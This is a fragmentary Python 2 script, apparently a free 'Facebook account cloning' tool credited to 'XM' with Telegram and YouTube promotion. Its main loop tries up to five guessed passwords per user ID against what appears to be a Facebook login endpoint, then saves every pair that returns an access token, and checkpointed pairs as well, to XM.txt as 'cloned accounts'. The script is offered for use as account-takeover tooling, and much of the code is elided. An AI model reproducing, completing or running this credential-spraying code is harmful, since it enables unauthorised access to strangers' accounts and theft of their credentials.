# MY TELEGRAM CHANNEL @XM
# MY TELEGRAM GROUP @ Tar Max Komand 
#MY GITHUB HTTPS://GITHUB.COM/XM
#THIS SCRIPT FREE 
...
XM_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])
...
def telegram():
	...
	os.system("xdg-open https://t.me/XMHickar")
...
\033[1;91m Author      : XM
\033[1;91m GitHub      : XM
\033[1;91m YouTube     : XM
\033[1;91m Telegram CH   : XM
\033[1;91m TLEGRAM GP    : XM
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[XM_OK] ' + k + c + user + ' | ' + pass1
                okb = open('XM.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[XM_CP] ' + k + c + user + ' | ' + pass1
                cps = open('XM.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[XM_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('XM.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[XM_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('XM.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[XM_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('XM.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[XM_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('XM.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[XM_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('XM.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[XM_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('XM.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[XM_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('XM.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[XM_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('XM.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : XM.txt'
